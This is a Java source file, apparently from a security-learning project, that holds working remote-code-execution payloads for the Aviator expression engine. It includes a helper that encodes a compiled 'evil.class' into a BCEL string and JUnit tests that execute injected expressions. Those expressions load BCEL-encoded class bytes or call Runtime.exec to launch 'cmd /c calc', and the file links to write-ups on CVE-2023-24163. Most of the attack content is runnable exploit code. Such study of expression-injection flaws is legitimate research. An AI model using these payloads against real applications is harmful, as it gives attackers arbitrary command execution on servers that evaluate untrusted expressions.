package com.best.hello.newPayload.RCE.Aviator;

import com.googlecode.aviator.AviatorEvaluator;
import com.googlecode.aviator.AviatorEvaluatorInstance;

import com.googlecode.aviator.Options;
import com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.junit.Test;

import java.io.FileOutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashSet;
import java.util.Set;

public class BCELEncode {
    public static String class2BCEL(String classFile) throws Exception{
        //将classFile转换为Path对象
        Path path = Paths.get(classFile);
        //使用Files.readAllBytes(path)方法读取类文件的内容，并将其存储在字节数组bytes中
        byte[] bytes = Files.readAllBytes(path);
        String result = Utility.encode(bytes,true);
        //返回Base64编码字符串
        return result;
    }


    public static void decode(String str) throws Exception{
        //解码为字节数组
        byte[] s =  Utility.decode(str,true);
        //把字节数组s写入"payload.class"的文件
        FileOutputStream fos = new FileOutputStream("payload.class");
        fos.write(s);
        fos.close();
    }

//    public static void main(String[] args) throws Exception {
//        //System.getProperty("user.dir")获取当前工作目录，并将相对路径与"SpringEcho.class"连接起来，得到Java类文件的完整路径。
//        // 然后，调用BCELEncode.class2BCEL方法，并将Java类文件的完整路径作为参数传递给它。这个方法将Java类文件编码为Base64编码字符串，并通过System.out.println将结果打印到控制台。
//        System.out.println(BCELEncode.class2BCEL(System.getProperty("user.dir")+"\\src\\test\\java\\com\\fastjson\\vul\\" +"SpringEcho.class"));
//    }

    public static void main(String []args) throws Exception{
//        Path path = Paths.get("evil.class");
        Path path = Paths.get("src/main/java/com/best/hello/newPayload/RCE/Aviator/evil.class");
//        Path path = Paths.get("target/classes/com/best/hello/controller/RCE/evil.class");
        byte[] data = Files.readAllBytes(path);
        String s =  Utility.encode(data,true);
        System.out.print("$$BCEL$$"+s);
    }


    @Test
    public void template(){
        AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();
        evaluator.setFunctionMissing(JavaMethodReflectionFunctionMissing.getInstance());
//        evaluator.execute("exec(Runtime.getRuntime(), 'cmd /c calc')");
//        evaluator.execute("exec(Runtime.getRuntime(), 'cmd /c calc')");
//        evaluator.execute("'a'+(c=Class.forName(\"\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\"cmd /c calc\") );");



    }
    @Test
    public void aviator(){
        AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();
//        Set<Class<?>> allowedClassSet = new HashSet<>();
//        allowedClassSet.add(java.util.ArrayList.class);
//        allowedClassSet.add(java.lang.Math.class);
//        evaluator.setOption(Options.ALLOWED_CLASS_SET, allowedClassSet);
//        evaluator.execute("'a'+(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$5dP$cbJ$c3P$Q$3d$d3$3c$8d$a9m$ad$f5$F$82$aeL$bb0$hw$R7RA$uVlq$9f$c6K$b9$rM$q$b9$z$fd$y$dd$a8$b8$f0$D$fc$uq$S$b4$z$5e$9833$87sf$86$fb$f5$fd$f1$J$e0$i$87$O$M$d4$j4$b0$5d$40$d3$c2$8e$85$W$c1$bc$90$89T$97$E$cdk$3f$Q$f4$ab$f4Q$Qj$3d$99$88$db$d9t$q$b2a8$8a$99$d1$c5BD$84S$af7$J$e7$a1$l$87$c9$d8$l$a8L$s$e3$a0$bdF$ddei$q$f2$3c$m8$ddE$q$9e$94L$93$dc$c2$$$f7$83t$96E$e2Z$W$d3$aaC$91$ab$ee$5c$c6g$85$d5$85$J$cb$c2$9e$8b$7d$i$b8p$b0I$b0$ff$U$84$faj$7c$7f4$R$91$o4KJ$a6$feM$7f$b9$86$d0X$J$efg$89$92S$de$e4$8c$85Z6$zo$fd$d6_$3a$c0$Jt$fe$9c$e2U$40$c5$z$8c6wG$9c$89$b3$d1y$D$bdpA$d8$604KR$e3$9a$_eK$n$3d$$$ad$80$fd$8eJ$e7$V$da$f3$3f$b5$B$97Q$e7$ba$ca$b1U$ae$aa$fd$A$bd2$a8$80$9d$B$A$A\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\"cmd /c calc\") );");
        // evil.class
        evaluator.execute("'a'+(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$5dPMK$c3$40$Q$7d$db$7c$d5$Ymk$ad_$m$e8$c9$b4$Hs$f1$W$f1$o$KB$b1b$c5$7b$S$97$b0$r$ddH$b2$v$fdYzQ$f1$e0$P$f0G$89$b3A$da$e2$c2$be$99y$fbf$e6$b1$df$3f$9f_$A$cep$e0$c2B$dbE$H$5b$g$ba$O$b6$j$f4$Y$ecs$n$85$ba$600$fc$fe$p$83y$99$3fq$86$d6PH$7e$5bMc$5e$3cDqF$8c$c9$e7$3ca8$f1$87$93h$W$FY$q$d3$60$ac$K$n$d3$b0$bfB$dd$Vy$c2$cb2dp$af$e6$J$7fV$o$97$a5$83$j$aa$c7yU$q$fcZ$e8ik$7c$s$b2S$dd$e6$c1$86$e3$60$d7$c3$k$f6$3d$b8X$d7$bb$e8$95$a1$bd$i$3b$8a$t$3cQ$M$dd$9a$Syp3Z$8cg$e8$y$85$f7$95TbJ$h$dc$94$abE$d1$f3W$3d$fe$d1$n$8ea$d2$a7$e8$d3$A$d3$3e$I$9bT$jRd$U$ad$c1$3b$d8$x$rd$98$d0$aeI$83rrI$zZzT$b7$C$cd$P4$Go0$5e$fe$a9$zx$84$s$e5$ht7$ebU$ad_8$G$t$i$95$B$A$A\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\"cmd /c calc\") );");

    }

    @Test
    public void aviatorShort(){
        AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();
        // solve Error: com.googlecode.aviator.exception.FunctionNotFoundException: Function not found: exec
        evaluator.setFunctionMissing(JavaMethodReflectionFunctionMissing.getInstance());
        evaluator.execute("exec(Runtime.getRuntime(), 'cmd /c calc');");
    }
    // https://www.ctfiot.com/104155.html
    // https://p0lar1ght.github.io/posts/Dromara_hutool_aviator%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2023-24163/

    // https://geekdaxue.co/read/lexiansheng@dix8fs/ll4oyy

    // BCEL
    // https://www.cnblogs.com/CoLo/p/15869871.html

    // https://github.com/killme2008/aviatorscript/issues/421

    // https://tonyharris.io/poc-week/poc-week-20240303/

}

